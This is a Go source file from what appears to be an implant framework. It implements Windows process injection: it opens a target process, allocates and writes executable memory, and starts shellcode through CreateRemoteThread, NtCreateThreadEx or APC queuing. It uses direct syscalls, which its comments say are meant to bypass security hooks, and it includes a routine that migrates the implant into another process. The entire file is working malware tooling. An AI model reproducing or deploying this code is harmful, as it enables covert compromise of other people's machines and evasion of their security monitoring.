// +build windows

package injection

import (
	"fmt"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ProcessInjection handles process injection operations
type ProcessInjection struct {
	logger       interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	directSyscall DirectSyscallInterface
	shellcodeAddr uintptr
	shellcodeSize uintptr
}

// DirectSyscallInterface provides syscall functionality
// This interface allows injection to work with any syscall implementation
type DirectSyscallInterface interface {
	Call(syscallName string, args ...uintptr) (uintptr, uintptr, error)
	GetSyscallNumber(syscallName string) (uint16, bool)
}

// NewProcessInjection creates a new process injection handler
func NewProcessInjection(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *ProcessInjection {
	return &ProcessInjection{
		logger:        logger,
		directSyscall: nil, // Must be set using SetDirectSyscall
	}
}

// SetDirectSyscall sets the direct syscall handler
// This must be called before using injection methods
func (pi *ProcessInjection) SetDirectSyscall(ds DirectSyscallInterface) {
	pi.directSyscall = ds
}

// InjectShellcode injects shellcode into a remote process
func (pi *ProcessInjection) InjectShellcode(pid int, shellcode []byte, method string) error {
	switch runtime.GOOS {
	case "windows":
		return pi.injectWindows(pid, shellcode, method)
	case "linux":
		return pi.injectLinux(pid, shellcode, method)
	case "darwin":
		return pi.injectDarwin(pid, shellcode, method)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// CreateRemoteThread creates a remote thread in target process
func (pi *ProcessInjection) CreateRemoteThread(pid int, shellcode []byte) error {
	return pi.InjectShellcode(pid, shellcode, "createremotethread")
}

// ProcessMigration migrates implant to another process
func (pi *ProcessInjection) ProcessMigration(targetPid int) error {
	pi.logger.Info("Migrating to process PID: %d", targetPid)
	
	// Get current shellcode
	currentShellcode := pi.getCurrentShellcode()
	if len(currentShellcode) == 0 {
		return fmt.Errorf("no current shellcode available for migration")
	}
	
	if err := pi.InjectShellcode(targetPid, currentShellcode, "createremotethread"); err != nil {
		return fmt.Errorf("migration failed: %w", err)
	}
	pi.logger.Info("Migration successful")
	return nil
}

// Platform-specific implementations
func (pi *ProcessInjection) injectWindows(pid int, shellcode []byte, method string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows injection only supported on Windows")
	}

	pi.logger.Info("Injecting shellcode into Windows process PID: %d using method: %s", pid, method)

	// Check if direct syscall is available
	if pi.directSyscall == nil {
		return fmt.Errorf("direct syscall handler not set - call SetDirectSyscall() first")
	}

	// Use direct syscalls to bypass hooks
	// Step 1: NtOpenProcess
	processHandle, err := pi.ntOpenProcess(uint32(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %w", err)
	}
	defer windows.CloseHandle(processHandle)

	// Step 2: NtAllocateVirtualMemory
	shellcodeSize := uintptr(len(shellcode))
	remoteAddr := uintptr(0)
	regionSize := shellcodeSize
	
	r1, _, err := pi.directSyscall.Call("NtAllocateVirtualMemory",
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&remoteAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	// NTSTATUS_SUCCESS = 0x00000000
	if err != nil || r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: status=0x%x, err=%v", r1, err)
	}
	
	if remoteAddr == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory returned null address")
	}
	pi.logger.Debug("Allocated remote memory at: 0x%x", remoteAddr)

	// Step 3: NtWriteVirtualMemory
	bytesWritten := uintptr(0)
	r1, _, err = pi.directSyscall.Call("NtWriteVirtualMemory",
		uintptr(processHandle),
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		shellcodeSize,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	// NTSTATUS_SUCCESS = 0x00000000
	if err != nil || r1 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed: status=0x%x, err=%v", r1, err)
	}
	if bytesWritten != shellcodeSize {
		return fmt.Errorf("partial write: wrote %d of %d bytes", bytesWritten, shellcodeSize)
	}
	pi.logger.Debug("Wrote %d bytes to remote process", bytesWritten)

	// Step 4: NtProtectVirtualMemory (change to RX)
	oldProtect := uint32(0)
	protectSize := shellcodeSize
	r1, _, err = pi.directSyscall.Call("NtProtectVirtualMemory",
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&remoteAddr)),
		uintptr(unsafe.Pointer(&protectSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	// NTSTATUS_SUCCESS = 0x00000000
	if err != nil || r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: status=0x%x, err=%v", r1, err)
	}

	// Step 5: Execute shellcode based on method
	switch method {
	case "createremotethread":
		return pi.createRemoteThread(processHandle, remoteAddr)
	case "ntcreatethreadex":
		return pi.ntCreateThreadEx(processHandle, remoteAddr)
	case "queueuserapc":
		return pi.queueUserAPC(processHandle, remoteAddr)
	default:
		return pi.createRemoteThread(processHandle, remoteAddr)
	}
}

// ntOpenProcess opens a process using direct syscall
func (pi *ProcessInjection) ntOpenProcess(pid uint32) (windows.Handle, error) {
	const PROCESS_ALL_ACCESS = 0x1F0FFF
	
	processHandle := windows.Handle(0)
	objectAttributes := uintptr(0)
	clientId := struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}

	r1, _, err := pi.directSyscall.Call("NtOpenProcess",
		uintptr(unsafe.Pointer(&processHandle)),
		PROCESS_ALL_ACCESS,
		objectAttributes,
		uintptr(unsafe.Pointer(&clientId)),
	)
	
	// NTSTATUS_SUCCESS = 0x00000000
	if err != nil || r1 != 0 {
		return 0, fmt.Errorf("NtOpenProcess failed: status=0x%x, err=%v", r1, err)
	}
	
	if processHandle == 0 {
		return 0, fmt.Errorf("NtOpenProcess returned null handle")
	}
	
	return processHandle, nil
}

// createRemoteThread creates a remote thread using CreateRemoteThread
func (pi *ProcessInjection) createRemoteThread(processHandle windows.Handle, startAddr uintptr) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createRemoteThread := kernel32.NewProc("CreateRemoteThread")

	var threadID uint32
	ret, _, err := createRemoteThread.Call(
		uintptr(processHandle),
		0, // lpThreadAttributes
		0, // dwStackSize
		startAddr,
		0, // lpParameter
		0, // dwCreationFlags
		uintptr(unsafe.Pointer(&threadID)),
	)

	if ret == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}

	pi.logger.Info("Created remote thread with ID: %d", threadID)
	return nil
}

// ntCreateThreadEx creates a remote thread using NtCreateThreadEx via direct syscall
func (pi *ProcessInjection) ntCreateThreadEx(processHandle windows.Handle, startAddr uintptr) error {
	threadHandle := windows.Handle(0)
	const THREAD_ALL_ACCESS = 0x1FFFFF
	
	r1, _, err := pi.directSyscall.Call("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&threadHandle)),
		THREAD_ALL_ACCESS,
		0, // ObjectAttributes
		uintptr(processHandle),
		startAddr,
		0, // lpParameter
		0, // CreateSuspended (0 = not suspended)
		0, // StackZeroBits
		0, // SizeOfStackCommit
		0, // SizeOfStackReserve
		0, // lpBytesBuffer
	)

	// NTSTATUS_SUCCESS = 0x00000000
	if err != nil || r1 != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: status=0x%x, err=%v", r1, err)
	}

	if threadHandle == 0 {
		return fmt.Errorf("NtCreateThreadEx returned null handle")
	}

	pi.logger.Info("Created remote thread via NtCreateThreadEx")
	defer windows.CloseHandle(threadHandle)
	return nil
}

// queueUserAPC uses QueueUserAPC to inject shellcode
func (pi *ProcessInjection) queueUserAPC(processHandle windows.Handle, startAddr uintptr) error {
	// Get main thread ID of target process
	threadID, err := pi.getMainThreadID(processHandle)
	if err != nil {
		return fmt.Errorf("failed to get main thread ID: %w", err)
	}

	// Open thread handle
	threadHandle, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, threadID)
	if err != nil {
		return fmt.Errorf("failed to open thread: %w", err)
	}
	defer windows.CloseHandle(threadHandle)

	// Queue APC
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	
	ret, _, err := queueUserAPC.Call(
		startAddr,
		uintptr(threadHandle),
		0,
	)
	
	if ret == 0 {
		return fmt.Errorf("QueueUserAPC failed: %w", err)
	}

	pi.logger.Info("Queued APC to thread ID: %d", threadID)
	return nil
}

// getMainThreadID gets the main thread ID of a process
func (pi *ProcessInjection) getMainThreadID(processHandle windows.Handle) (uint32, error) {
	// Use CreateToolhelp32Snapshot to enumerate threads
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ThreadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Thread32First(snapshot, &entry)
	if err != nil {
		return 0, err
	}

	// Get process ID from handle using NtQueryInformationProcess
	processID := uint32(0)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	
	type ProcessBasicInformation struct {
		ExitStatus                   uint32
		PebBaseAddress              uintptr
		AffinityMask                uint64
		BasePriority                uint32
		UniqueProcessId             uintptr
		InheritedFromUniqueProcessId uintptr
	}
	
	var pbi ProcessBasicInformation
	ret, _, _ := ntQueryInformationProcess.Call(
		uintptr(processHandle),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		0,
	)
	
	if ret == 0 {
		processID = uint32(pbi.UniqueProcessId)
	} else {
		return 0, fmt.Errorf("failed to get process ID")
	}

	// Find first thread belonging to the process
	for {
		if entry.OwnerProcessID == processID {
			return entry.ThreadID, nil
		}

		err = windows.Thread32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("main thread not found")
}

func (pi *ProcessInjection) injectLinux(pid int, shellcode []byte, method string) error {
	pi.logger.Info("Injecting shellcode into Linux process PID: %d", pid)
	// Linux injection is implemented in process_linux.go
	// This fallback should not be called when building for Linux
	return fmt.Errorf("Linux injection requires Linux build target - use process_linux.go")
}

func (pi *ProcessInjection) injectDarwin(pid int, shellcode []byte, method string) error {
	pi.logger.Info("Injecting shellcode into macOS process PID: %d", pid)
	// macOS injection is implemented in process_darwin.go
	// This fallback should not be called when building for Darwin
	return fmt.Errorf("macOS injection requires Darwin build target - use process_darwin.go")
}

// SetCurrentShellcode sets the current shellcode for migration
func (pi *ProcessInjection) SetCurrentShellcode(shellcode []byte) {
	if len(shellcode) > 0 {
		pi.shellcodeAddr = uintptr(unsafe.Pointer(&shellcode[0]))
		pi.shellcodeSize = uintptr(len(shellcode))
	}
}

// getCurrentShellcode extracts current shellcode from memory
func (pi *ProcessInjection) getCurrentShellcode() []byte {
	// Method 1: Use stored shellcode address if available
	if pi.shellcodeAddr != 0 && pi.shellcodeSize > 0 {
		shellcode := make([]byte, pi.shellcodeSize)
		for i := uintptr(0); i < pi.shellcodeSize; i++ {
			shellcode[i] = *(*byte)(unsafe.Pointer(pi.shellcodeAddr + i))
		}
		return shellcode
	}

	// Method 2: Return empty if no shellcode found
	// In production, this would be passed from the caller
	return []byte{}
}

// ExtractShellcodeFromModule extracts shellcode from a loaded module
func (pi *ProcessInjection) ExtractShellcodeFromModule(moduleName string) ([]byte, error) {
	module := windows.NewLazySystemDLL(moduleName)
	if module == nil {
		return nil, fmt.Errorf("module not found: %s", moduleName)
	}

	// Get module handle
	handle := module.Handle()
	if handle == 0 {
		return nil, fmt.Errorf("invalid module handle")
	}

	// Read module memory using ReadProcessMemory on self
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getModuleInformation := kernel32.NewProc("GetModuleInformation")
	
	type ModuleInfo struct {
		BaseOfDll   uintptr
		SizeOfImage uint32
		EntryPoint  uintptr
	}
	
	var modInfo ModuleInfo
	ret, _, err := getModuleInformation.Call(
		windows.CurrentProcess(),
		handle,
		uintptr(unsafe.Pointer(&modInfo)),
		uintptr(unsafe.Sizeof(modInfo)),
	)
	
	if ret == 0 {
		return nil, fmt.Errorf("failed to get module info: %w", err)
	}

	// Read module memory
	shellcode := make([]byte, modInfo.SizeOfImage)
	readProcessMemory := kernel32.NewProc("ReadProcessMemory")
	var bytesRead uintptr
	
	ret, _, err = readProcessMemory.Call(
		windows.CurrentProcess(),
		modInfo.BaseOfDll,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(modInfo.SizeOfImage),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	
	if ret == 0 {
		return nil, fmt.Errorf("failed to read module memory: %w", err)
	}

	return shellcode[:bytesRead], nil
}
